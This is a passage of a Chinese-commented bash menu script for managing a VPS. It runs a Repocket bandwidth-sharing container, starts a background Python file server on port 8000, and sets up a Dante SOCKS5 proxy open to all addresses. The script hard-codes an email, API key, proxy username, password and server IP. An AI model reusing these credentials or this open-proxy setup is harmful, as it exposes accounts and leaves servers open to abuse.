        docker pull repocket/repocket:latest && docker run --name repocket -e RP_EMAIL=nanningjyd@hotmail.com -e RP_API_KEY=af5bdf24-4d9e-46a1-802a-eeb3ce90a811 -d --restart=always repocket/repocket
      ;;
      [Nn])
      echo "输入Ndocker安装"
        apt install docker.io -y && docker pull repocket/repocket:latest && docker run --name repocket -e RP_EMAIL=nanningjyd@hotmail.com -e RP_API_KEY=af5bdf24-4d9e-46a1-802a-eeb3ce90a811 -d --restart=always repocket/repocket
      ;;
      *)
      echo "回车或者其他键跳过docker安装"
        docker pull repocket/repocket:latest && docker run --name repocket -e RP_EMAIL=nanningjyd@hotmail.com -e RP_API_KEY=af5bdf24-4d9e-46a1-802a-eeb3ce90a811 -d --restart=always repocket/repocket
      ;;
    esac
    ;;    
  17)
    clear
    nohup python3 -m http.server 8000 > /dev/null 2> /dev/null &
    ;;  
  18)
    clear
    # 等待APT锁释放
    while sudo fuser /var/lib/apt/lists/lock >/dev/null 2>&1 ; do
    echo "APT锁被使用，等待中..."
    sleep 2
    done

    # 没有锁定后，执行命令
    sudo dpkg --configure -a && sudo apt-get install -f && sudo apt update && \
    if ! dpkg -l | grep -q dante-server; then sudo apt install -y dante-server; fi && \
    INTERFACE=$(ip -o -4 route show to default | awk '{print $5}') && \
    if id "jjyydd" &>/dev/null; then echo "jjyydd:dept1235" | sudo chpasswd; else sudo adduser --disabled-password --gecos "" jjyydd && echo "jjyydd:dept1235" | sudo chpasswd; fi && \
    if [ -f /etc/danted.conf ]; then sudo cp /etc/danted.conf /etc/danted.conf.bak; fi && \
    echo -e "logoutput: syslog\n\ninternal: $INTERFACE port = 1080\nexternal: $INTERFACE\n\nsocksmethod: username\nuser.privileged: root\nuser.notprivileged: nobody\nuser.libwrap: nobody\n\nclient pass {\n    from: 0.0.0.0/0 to: 0.0.0.0/0\n    log: error connect disconnect\n}\n\nsocks pass {\n    from: 0.0.0.0/0 to: 0.0.0.0/0\n    command: connect bind udpassociate\n    log: error connect disconnect\n}" | sudo tee /etc/danted.conf && \
    sudo systemctl restart danted && \
    sudo systemctl enable danted && \
    echo "服务重启完成，开始测试代理..." && \
    VPS_IP=35.207.31.62 && \
    echo "正在测试SOCKS5代理..." && \
    RESULT=$(curl -s --socks5 jjyydd:dept1235@$VPS_IP:1080 http://ifconfig.me) && \
    if [ "$RESULT" == "$VPS_IP" ]; then echo "代理测试成功，返回的IP地址是: $RESULT"; else echo "代理测试失败。"; fi || echo "命令失败，请检查输出信息以判断错误位置。"
    ;;   
  0)
    clear
    exit
    ;;

  *)
    echo "无效的输入!"

esac
  echo -e "\033[0;32m操作完成\033[0m"
  echo "按任意键继续..."
  read -n 1 -s -r -p ""
  echo ""
  clear
done
